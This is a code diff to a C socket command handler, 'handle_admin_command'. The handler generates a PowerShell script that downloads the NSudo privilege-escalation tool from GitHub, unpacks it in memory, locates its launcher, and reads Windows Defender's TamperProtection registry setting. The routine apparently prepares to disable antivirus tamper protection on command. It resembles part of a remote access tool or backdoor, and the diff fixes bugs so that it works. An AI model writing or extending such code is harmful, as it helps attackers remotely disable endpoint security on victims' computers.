@@ -213,8 +213,9 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             fprintf(f, "$resp = Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' -UseBasicParsing\n");
             fprintf(f, "$bytes = $resp.Content\n");
             fprintf(f, "Write-Host \"[STEP 4] Download complete. Size: $($bytes.Length) bytes\"\n");
-            fprintf(f, "Write-Host '[STEP 5] Opening zip archive in memory...'\n");
-            fprintf(f, "$stream = New-Object System.IO.MemoryStream($bytes)\n");
+            fprintf(f, "Write-Host '[STEP 5] Loading compression assembly and opening zip in memory...'\n");
+            fprintf(f, "Add-Type -AssemblyName System.IO.Compression\n");
+            fprintf(f, "$stream = New-Object System.IO.MemoryStream(,$bytes)\n");
             fprintf(f, "$zip = [System.IO.Compression.ZipArchive]::new($stream)\n");
             fprintf(f, "Write-Host \"[STEP 6] Zip contains $($zip.Entries.Count) files\"\n");
             fprintf(f, "$extracted = 0\n");
@@ -233,11 +234,11 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             fprintf(f, "Write-Host \"[STEP 7] Extraction complete. $extracted files written to disk.\"\n");
             fprintf(f, "$zip.Dispose()\n");
             fprintf(f, "$stream.Dispose()\n");
-            fprintf(f, "Write-Host '[STEP 8] Checking for NSudoLC.exe...'\n");
-            fprintf(f, "$exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLC.exe'\n");
+            fprintf(f, "Write-Host '[STEP 8] Checking for NSudoLG.exe...'\n");
+            fprintf(f, "$exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLG.exe'\n");
             fprintf(f, "Write-Host \"  Looking for: $exe\"\n");
             fprintf(f, "if (Test-Path $exe) {\n");
-            fprintf(f, "    Write-Host '[STEP 9] NSudoLC.exe FOUND.'\n");
+            fprintf(f, "    Write-Host '[STEP 9] NSudoLG.exe FOUND.'\n");
             fprintf(f, "    Write-Host '[STEP 10] Checking current TamperProtection value...'\n");
             fprintf(f, "    $before = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name TamperProtection -ErrorAction SilentlyContinue\n");
             fprintf(f, "    Write-Host \"  Before: $($before.TamperProtection)\"\n");
